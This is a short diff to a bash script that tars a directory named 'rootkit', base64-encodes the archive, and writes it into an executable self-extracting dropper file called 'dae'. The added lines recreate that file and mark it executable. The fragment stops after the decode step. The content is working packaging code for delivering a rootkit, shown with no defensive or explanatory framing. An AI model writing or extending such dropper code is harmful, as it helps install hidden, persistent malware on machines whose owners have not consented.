@@ -15,6 +15,12 @@ cp ./rootkit/* rk
 tar cvzf ./rk.tar.gz ./rk
 cp ./rk.tar.gz ./rootkit
 cd ->/dev/null
+if [[ -f dae ]]; then
+	rm dae
+fi
+touch dae
+chmod 00755 dae
+chmod +rwx dae
 echo -ne "#!/bin/bash\n\necho '" > dae
 base64 rk.tar.gz -w0 >> dae
 echo -ne "' | base64 -d > rk.tar.gz\n\n" >> dae
